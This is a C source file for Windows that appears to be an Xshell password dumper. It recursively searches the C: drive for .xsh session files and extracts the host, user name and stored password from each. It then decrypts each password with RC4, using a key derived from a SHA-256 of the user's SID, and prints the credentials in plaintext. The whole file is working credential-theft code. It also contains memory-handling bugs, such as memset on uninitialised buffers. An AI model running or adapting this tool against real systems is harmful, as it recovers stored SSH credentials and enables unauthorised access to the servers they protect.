#include"headfile.h"

void path_add(char* tmp);
void trave_path();
void free_path();
void find(char* path, char* name);
char* become_char(WCHAR* source, int size);
char* getfileall(char* fname, int MODEL);
int get_len(char* ptr);
char* extract(char* txt, char* name);

int num1 = 0;
extern char* path_name[file_Num] = { 0 };
extern int path_num = 0;

//填充路径
void path_add(char* tmp)
{
    for (int i = 0; i < 256; i++)
    {
        if (path_name[i] == 0)
        {
            path_name[i] = tmp;
            path_num++;
            return;
        }
    }

}

//遍历路径数组
void trave_path()
{
    for (int i = 0; i < path_num; i++)
    {
        if (path_name[i] != 0)
        {
            //printf("%s\n", path_name[i]);
            char* p = getfileall(path_name[i], 1);
            char* x = extract(p, "Password");
        }
    }
}

//释放
void free_path()
{
    for (int i = 0; i < path_num; i++)
    {
        free(path_name[i]);
    }
}

//遍历查找
void find(char* path, char* name)
{
    char szFind[MAX_PATH], szFile[MAX_PATH];
    WIN32_FIND_DATA fd;
    sprintf(szFind, "%s\\%s", path, name);
    HANDLE hFind = FindFirstFile(szFind, &fd);
    if (INVALID_HANDLE_VALUE != hFind)
    {
        while (1)
        {
            char* q = name;
            char* p = fd.cFileName;
            while (q) {
                if (*q == '.')break;   //匹配扩展名
                q++;
            }
            while (p) {
                if (*p == '.')break;
                p++;
            }
            if (strncmp(p, q, strlen(q) + 1) != 0) {
                if (!FindNextFile(hFind, &fd))break;
                continue;
            }
            int path_len = strlen(path) + strlen(fd.cFileName);

            char* tmp_pathname = (char*)malloc(file_Len);
            sprintf(tmp_pathname, "%s\\%s", path, fd.cFileName);
            path_add(tmp_pathname);

            num1++;
            if (!FindNextFile(hFind, &fd))break;
        }
        FindClose(hFind);
    }
    sprintf(szFind, "%s\\*.*", path);

    hFind = FindFirstFile(szFind, &fd);
    if (INVALID_HANDLE_VALUE == hFind)
        return;
    while (TRUE)
    {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if (fd.cFileName[0] != '.')
            {
                sprintf(szFile, "%s\\%s", path, fd.cFileName);
                find(szFile, name);
            }
        }
        if (!FindNextFile(hFind, &fd))break;
    }
    FindClose(hFind);
}

//宽字符转换
char* become_char(WCHAR* source, int size)
{
    char* tmp = (char*)malloc(size / 2 + 1);
    WideCharToMultiByte(CP_ACP, 0, source, wcslen(source), tmp, size, NULL, NULL);
    tmp[strlen(tmp)] = '\0';
    free(source);
    return tmp;
}

//读取文件所有内容并输出到 buffer数组中
char* getfileall(char* fname, int MODEL)
{
    FILE* file = fopen(fname, "rb+");
    fpos_t pos = 0;
    fgetpos(file, &pos);
    fseek(file, 0, SEEK_END);
    int filesize = ftell(file);
    char* buffer = (char*)malloc(filesize + 1);
    memset(buffer, 0, strlen(buffer));
    buffer[filesize] = '\0';
    fsetpos(file, &pos);
    fread(buffer, sizeof(char), filesize, file);
    fclose(file);
    if (MODEL == WCHAR_MODEL)
    {
        return become_char(buffer, filesize);
    }
    else if (MODEL == CHAR_MODEL)
    {
        return buffer;
    }
}

//输出长度
int get_len(char* ptr)
{
    int len = 0;
    char* ptr2 = ptr;
    while (*ptr2 != '\n')
    {
        len++;
        ptr2++;
    }
    return len;
}

//从buffer数组中匹配需要查找的字符串
char* extract(char* txt, char* name)
{
    char* ptr = NULL;
    ptr = txt;
    int total = 0;

    do
    {
        if (total > 0)
            ptr += strlen(name);

        ptr = strstr(ptr, name);
        if (ptr == NULL)
        {
            printf("没有找到该字段\n");
            return NULL;
        }
        total++;
    } while (*(ptr - 1) != 0x0a);

    ptr = ptr + strlen(name) + 1;
    int len = get_len(ptr);
    char* final = (char*)malloc(len + 1);
    memset(final, 0, strlen(final) + 1);
    strncat(final, ptr, len);
    final[strlen(final) + 1] = '\0';
    return final;
}

//删除数组的后32位
char* delete_l32(char* source)
{
    char* output = NULL;
    char* ptr = NULL;
    int source_len = strlen(source);
    int delete_Local = source_len - 32; //从第几位开始删
    int output_len = source_len + 1;

    if (delete_Local < 0)
    {
        printf("delete_l32 called:source字符串长度不够\n");
        return NULL;
    }
    output = (char*)malloc(output_len);
    memset(output, 0, output_len);
    strcpy(output, source);

    ptr = output + delete_Local;

    memset(ptr, 0, 32);

    //printf("%s\n", output);

    return output;

}

int main(int argc,char** argv) {

    char* sid = Getsid();
    //printf("%s", sid);

    char* p = NULL;
    char path[] = "C:\\";
    char name[] = "*.xsh";
    char* key = Getsid();

    find(path, name);
    trave_path();

    for (int i = 0; i < path_num; i++) {
        p = getfileall(path_name[i], 1);

        sha256_context ctx;

        char* res = NULL;
        char* pDate = NULL;
        uint8_t hv[32];

        DWORD encmeter_bin_len = 0;

        ZeroMemory(hv, 32, 0);

        char* host = extract(p, "Host");
        char* username = extract(p, "UserName");
        char* Password = extract(p, "Password");

        printf("Host:%s\n", host);
        printf("UserName:%s\n", username);
        //printf("Password:%s\n", Password);
  
        char* de_code = Password;

        res = base64_decode(de_code);

        char* buf = sid;
        int pData_len = strlen(res) - 0x20;
        pDate = (char*)malloc(pData_len);
        ZeroMemory(pDate, pData_len, 0);
        memcpy(pDate, res, pData_len);


        sha256_init(&ctx);
        sha256_hash(&ctx, (uint8_t*)buf, (uint32_t)strlen(buf));
        sha256_done(&ctx, hv);

        BYTE* rc4_key = (BYTE*)malloc(32);
        ZeroMemory(rc4_key, 32, 0);
        memcpy(rc4_key, hv, 32);
        int rc4_key_len = 32;

        //pDate  pData_len  rc4_key  rc4_key_len/32

        char* passwd = RC4(pDate, pData_len, rc4_key, rc4_key_len);
        printf("Password:%s", passwd);

        printf("\n\n");
    }
    free_path();

    printf("Finished!");
    return 0;
}
